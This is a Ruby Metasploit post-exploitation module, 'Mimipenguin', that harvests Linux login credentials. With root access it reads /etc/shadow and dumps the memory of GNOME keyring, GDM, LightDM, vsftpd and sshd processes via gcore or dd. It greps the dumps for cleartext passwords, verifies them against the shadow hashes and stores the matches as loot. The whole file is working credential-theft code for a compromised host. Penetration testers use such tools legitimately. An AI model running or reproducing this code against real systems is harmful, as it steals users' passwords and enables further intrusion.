##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System
  include Msf::Auxiliary::Report

  PROCESSES = [{
    app:     'Gnome Password',
    cmdline: ['gdm-password'],
    needles: ['^_pammodutil_getpwnam_root_1$', '^gkr_system_authtok$']
  }, {
    app:     'Gnome Keyring',
    cmdline: ['gnome-keyring-daemon'],
    needles: ['^.+libgck\-1\.so\.0$', 'libgcrypt\.so\..+$', 'linux-vdso\.so\.1$']
  }, {
    app:     'LightDM',
    cmdline: ['lightdm'],
    needles: ['^_pammodutil_getspnam_']
  }, {
    app:     'VSFTP',
    cmdline: ['vsftpd'],
    needles: ['^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$']
  }, {
    app:     'SSH',
    cmdline: ['sshd:'],
    needles: ['^sudo.+']
  }].freeze

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Mimipenguin',
      'Description'   => 'This module searches process memory for system user credentials.',
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'huntergregal',    # mimipenguin.sh
          'the-useless-one', # mimipenguin.py
          'bcoles'           # Metasploit
        ],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter'],
      'References'    => [['URL', 'https://github.com/huntergregal/mimipenguin']]))
    register_options [
      OptString.new('WritableDir', [true, 'A directory where we can write files', '/tmp'])
    ]
  end

  def base_dir
    datastore['WritableDir']
  end

  #
  # Get password hashes for all users
  #
  def get_hashes
    hashes = []

    shadow = read_file '/etc/shadow' || ''
    shadow.each_line do |line|
      user, hash = line.split(':')[0..1]
      next if hash.eql? '*'
      next if hash.start_with? '!'
      hashes << { user: user, hash: hash }
    end

    hashes
  end

  #
  # Dump process memory
  #
  def dump_mem(pid, dumpfile)
    case @dump_technique.to_s
    when 'gcore'
      dump_mem_gcore pid, dumpfile
    when 'dd'
      dump_mem_dd pid, dumpfile
    end
  end

  #
  # Dump process memory with gcore
  #
  def dump_mem_gcore(pid, dumpfile)
    res = cmd_exec "gcore -o '#{dumpfile}' #{pid}", nil, 60
    res.include? 'Saved corefile'
  rescue
    false
  end

  #
  # Dump process memory with dd
  #
  def dump_mem_dd(pid, dumpfile)
    mem_maps = cmd_exec("grep -E '^[0-9a-f-]* r' /proc/#{pid}/maps | cut -d' ' -f 1").to_s.chomp
    mem_maps.each_line do |line|
      memrange_start = line.chomp.split('-')[0].to_i(16)
      memrange_stop = line.chomp.split('-')[1].to_i(16)
      memrange_size = memrange_stop - memrange_start

      next if memrange_size <= 0

      # vprint_status "Dumping memory (bytes #{memrange_start} - #{memrange_stop}) from process #{pid} (#{memrange_size} bytes)"
      cmd = "dd if=/proc/#{pid}/mem of=\"#{dumpfile}.#{pid}\""
      cmd += " ibs=1 oflag=append conv=notrunc skip=\"#{memrange_start}\" count=\"#{memrange_size}\""
      cmd += " > /dev/null 2>&1"
      cmd_exec cmd
    end
    true
  rescue
    false
  end

  #
  # Check credentials
  #
  # Returns an array of users for which the specified password is valid
  #
  def check_valid_password(password)
    users = []

    @hashes.each do |h|
      hash = h[:hash]
      type = hash.split('$')[1]
      salt = hash.split('$')[2]
      if password.crypt("$#{type}$#{salt}").to_s.eql? hash
        users << h[:user]
      end
    end

    users
  end

  #
  # dump process +pid+ memory to dumpfile on filesystem,
  # and search the dumpfile for +match_strings+
  #
  # @returns [Array] potential_passwords
  #
  def search_mem(pid, match_strings)
    potential_passwords = []

    vprint_status "Searching process #{pid} ..."
    dumpfile = "#{base_dir}/.#{Rex::Text.rand_text_alphanumeric(10..15)}"
    unless dump_mem(pid, dumpfile)
      print_error "Error creating dump file for process #{pid}"
      return []
    end

    match_strings.each do |needle|
      grep_mem = cmd_exec("strings '#{dumpfile}.#{pid}' | grep -E -a -B10 -A10 '#{needle}'").to_s
      grep_mem.each_line do |line|
        potential_passwords << line.chomp
      end
    end

    rm_f "#{dumpfile}.#{pid}"

    potential_passwords.uniq
  end

  def run
    unless is_root?
      fail_with Failure::BadConfig, 'Root privileges are required'
    end

    unless cmd_exec("test -w '#{base_dir}' && echo true").include? 'true'
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    %w[strings grep].each do |cmd|
      unless command_exists? cmd
        fail_with Failure::NotVulnerable, "#{cmd} is required but not installed"
      end
    end

    if command_exists? 'gcore'
      @dump_technique = 'gcore'
    elsif command_exists? 'dd'
      @dump_technique = 'dd'
    else
      fail_with Failure::NotVulnerable, "No tools to dump memory are available (#{tools.join(' / ')})"
    end

    vprint_status 'Retrieving password hashes...'
    @hashes = get_hashes
    if @hashes.empty?
      fail_with Failure::Unknown, 'Found no password hashes'
    end
    vprint_status "Found password hashes for #{@hashes.size} users"

    print_status 'Dumping credentials...'
    creds = []
    PROCESSES.each do |process|
      app = process[:app]

      process[:cmdline].each do |cmdline|
        pidof(cmdline).each do |pid|
          vprint_status "Found #{app} process ID: #{pid}"
          search_mem(pid, process[:needles]).each do |password|
            check_valid_password(password).each do |user|
              vprint_good "[#{app}] Found credentials: #{user}:#{password}"
              creds << [app, user, password]
              store_valid_credential user: user, private: password, proof: app
            end
          end
        end
      end
    end

    if creds.empty?
      print_status 'Found no credentials'
      return
    end

    creds.uniq!

    vprint_good "Found #{creds.size} credentials"
    table = Rex::Text::Table.new(
      'Header'    => 'Credentials',
      'Indent'    => 2,
      'SortIndex' => 0,
      'Columns'   => ['Application', 'Username', 'Password']
    )
    creds.each { |c| table << c }
    print_line
    print_line table.to_s

    p = store_loot(
      'mimipenguin.csv',
      'text/plain',
      session,
      table.to_csv,
      nil
    )

    print_status "Credentials stored in #{p}"
  end
end
